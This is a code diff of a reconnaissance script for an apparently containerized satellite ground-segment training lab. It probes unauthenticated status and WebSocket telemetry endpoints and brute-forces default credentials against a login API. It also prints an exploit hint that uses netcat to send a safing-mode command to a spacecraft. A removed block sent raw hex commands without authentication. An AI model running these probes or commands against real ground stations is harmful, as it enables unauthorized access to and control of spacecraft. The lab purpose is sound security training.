@@ -12,21 +12,20 @@ ground segment (MOC and ground station) to enumerate:
   - Session management weaknesses
   - Telemetry data accessible without auth
 
-This models pre-attack recon from a position on the 192.168.60.0/24 network.
-In real incidents (Viasat KA-SAT, 2022), attackers on the management
-network could reach ground station infrastructure directly.
+From the host, only exposed ports are reachable: MOC (localhost:8080),
+GS-BETA (localhost:4820). Internal IPs (192.168.61/62/63.x) are only
+reachable from inside the Docker networks.
 
 Usage:
   python3 ground_station_scanner.py
   python3 ground_station_scanner.py --target moc
   python3 ground_station_scanner.py --target gs
   python3 ground_station_scanner.py --target all
-  python3 ground_station_scanner.py --mode passive
 
 Common Beginner Mistakes:
-  - Scanning satellite UDP port from outside the spacelab network won't work
-  - The /api/telemetry endpoint returns {} if satellite hasn't sent data yet
-  - Ground station status port 5900 only holds connection open briefly
+  - Scanning satellite UDP port from outside Docker won't work; use ccsds_packet_forge.py via GS-BETA relay
+  - The MOC has no /api/telemetry endpoint; use /status for health or ws://localhost:8765 for live TLM
+  - GS-BETA login is POST /api/login, not /login
 """
 
 import argparse
@@ -36,12 +35,11 @@ import sys
 
 import requests
 
-MOC_IP = "192.168.60.11"
+MOC_HOST = "127.0.0.1"
 MOC_PORT = 8080
-GS_IP = "192.168.60.10"
-GS_STATUS_PORT = 5900
+GS_HOST = "127.0.0.1"
 GS_CMD_PORT = 4820
-SATELLITE_IP = "192.168.60.100"
+SATELLITE_IP = "192.168.61.100"  # only reachable from inside Docker cmd network
 
 CREDENTIALS_TO_TRY = [
     ("admin", "admin"),
@@ -85,66 +83,48 @@ def scan_moc():
     banner("MOC Reconnaissance")
 
     # Port check
-    open_moc = scan_tcp_port(MOC_IP, MOC_PORT)
-    print(f"  Port {MOC_IP}:{MOC_PORT}/tcp: {'OPEN' if open_moc else 'CLOSED'}")
+    open_moc = scan_tcp_port(MOC_HOST, MOC_PORT)
+    print(f"  Port {MOC_HOST}:{MOC_PORT}/tcp: {'OPEN' if open_moc else 'CLOSED'}")
     if not open_moc:
         print("  MOC not reachable. Check: cd lab && docker compose up -d")
         return
 
-    # Health endpoint (no auth)
+    # Status endpoint (no auth required)
     try:
-        r = requests.get(f"http://{MOC_IP}:{MOC_PORT}/health", timeout=3)
-        print(f"  GET /health: {r.status_code} — {r.text[:100]}")
-    except Exception as e:
-        print(f"  GET /health: error ({e})")
-
-    # Unauthenticated telemetry
-    try:
-        r = requests.get(f"http://{MOC_IP}:{MOC_PORT}/api/telemetry", timeout=3)
-        print(f"  GET /api/telemetry (NO AUTH): {r.status_code}")
+        r = requests.get(f"http://{MOC_HOST}:{MOC_PORT}/status", timeout=3)
+        print(f"  GET /status (NO AUTH): {r.status_code}")
         if r.status_code == 200:
-            tlm = r.json()
-            print(f"    satellite_id: {tlm.get('satellite_id', '?')}")
-            print(f"    uptime_s: {tlm.get('uptime_s', '?')}")
-            print(f"    camera_enabled: {tlm.get('camera_enabled', '?')}")
-            print(f"    downlink_enabled: {tlm.get('downlink_enabled', '?')}")
-            if tlm.get("downlink_enabled"):
-                mp = tlm.get("mission_plan", {})
-                if mp:
-                    print(f"    mission_plan (SENSITIVE): {json.dumps(mp)}")
+            data = r.json()
+            print(f"    moc_id:             {data.get('moc_id', '?')}")
+            print(f"    uptime_s:           {data.get('uptime_s', '?')}")
+            print(f"    satellites_tracked: {data.get('satellites_tracked', '?')}")
+            print(f"    ws_clients:         {data.get('ws_clients', '?')}")
+            print(f"  *** MOC STATUS READABLE WITHOUT AUTH ***")
     except Exception as e:
-        print(f"  GET /api/telemetry: error ({e})")
+        print(f"  GET /status: error ({e})")
 
-    # Raw command API (no auth)
-    try:
-        r = requests.post(
-            f"http://{MOC_IP}:{MOC_PORT}/api/command/raw",
-            json={"hex": "1a00c0000001 00ff".replace(" ", ""), "note": "recon_probe"},
-            timeout=3
-        )
-        print(f"  POST /api/command/raw (NO AUTH): {r.status_code}")
-        if r.status_code in (200, 400):
-            print(f"    Response: {r.text[:150]}")
-            if r.status_code == 200:
-                print(f"    *** UNAUTHENTICATED COMMAND INJECTION CONFIRMED ***")
-    except Exception as e:
-        print(f"  POST /api/command/raw: error ({e})")
+    # WebSocket TLM stream (no auth)
+    print(f"\n  WebSocket TLM (ws://{MOC_HOST}:8765) — no auth required (MC-MOC-1)")
+    print(f"    Connect with: wscat -c ws://{MOC_HOST}:8765")
+    print(f"    Or: python3 -c \"import websockets,asyncio; ...")
 
-    # Credential brute force
-    print(f"\n  Credential enumeration (POST /login):")
+    # Credential brute force on actual login endpoint
+    print(f"\n  Credential enumeration (POST /api/login):")
     session = requests.Session()
     for user, pwd in CREDENTIALS_TO_TRY:
         try:
             r = session.post(
-                f"http://{MOC_IP}:{MOC_PORT}/login",
-                data={"username": user, "password": pwd},
-                allow_redirects=True,
+                f"http://{MOC_HOST}:{MOC_PORT}/api/login",
+                json={"username": user, "password": pwd},
                 timeout=3
             )
-            if "DASHBOARD" in r.text or "telemetry" in r.text.lower():
-                print(f"    {user}:{pwd} — VALID (got dashboard)")
+            if r.status_code == 200:
+                data = r.json()
+                token = data.get("token", "")
+                print(f"    {user}:{pwd} — VALID  token={token[:20]}...")
+                print(f"    *** VALID CREDENTIALS FOUND: {user}:{pwd} ***")
             else:
-                print(f"    {user}:{pwd} — invalid")
+                print(f"    {user}:{pwd} — {r.status_code} invalid")
         except Exception as e:
             print(f"    {user}:{pwd} — error ({e})")
 
@@ -154,28 +134,26 @@ def scan_moc():
 def scan_gs():
     banner("Ground Station Reconnaissance")
 
-    # Command gateway port
-    open_cmd = scan_tcp_port(GS_IP, GS_CMD_PORT)
-    print(f"  Port {GS_IP}:{GS_CMD_PORT}/tcp (cmd gateway): {'OPEN' if open_cmd else 'CLOSED'}")
+    # GS-BETA command gateway (exposed on localhost:4820)
+    open_cmd = scan_tcp_port(GS_HOST, GS_CMD_PORT)
+    print(f"  Port {GS_HOST}:{GS_CMD_PORT}/tcp (GS-BETA cmd gateway): {'OPEN' if open_cmd else 'CLOSED'}")
 
-    # Status port — leaks credentials
-    open_status = scan_tcp_port(GS_IP, GS_STATUS_PORT)
-    print(f"  Port {GS_IP}:{GS_STATUS_PORT}/tcp (status):     {'OPEN' if open_status else 'CLOSED'}")
-
-    if open_status:
-        banner_text = grab_tcp_banner(GS_IP, GS_STATUS_PORT)
-        print(f"\n  Status banner (credentials in plaintext):")
+    if open_cmd:
+        banner_text = grab_tcp_banner(GS_HOST, GS_CMD_PORT)
+        print(f"\n  GS-BETA banner:")
         for line in banner_text.splitlines():
             print(f"    {line}")
-        if "Auth:" in banner_text or "operator" in banner_text.lower():
-            print("\n  *** CREDENTIALS EXPOSED IN PLAINTEXT ***")
+        if "MAINTENANCE" in banner_text:
+            print("\n  *** GS-BETA IS IN MAINTENANCE MODE — NO AUTH REQUIRED (MC-GS-3) ***")
+            print("  Exploit: nc localhost 4820")
+            print("           SENDCMD SpaceVE-1A SAFING_MODE")
 
 
 def scan_satellite():
     banner("Satellite Port Recon (passive)")
     print(f"  {SATELLITE_IP}:1234/udp — CCSDS command port (no auth)")
-    print(f"  Cannot be confirmed via simple TCP probe (UDP — use ccsds_packet_forge.py)")
-    print(f"  Confirmed by: cFS CI_LAB default config, no auth in SpaceVE-1 cfs_stub.py")
+    print(f"  Cannot be confirmed via simple TCP probe (UDP — use ccsds_packet_forge.py inside Docker)")
+    print(f"  From host: use GS-BETA relay (localhost:4820) instead of direct UDP")
 
 
 def main():
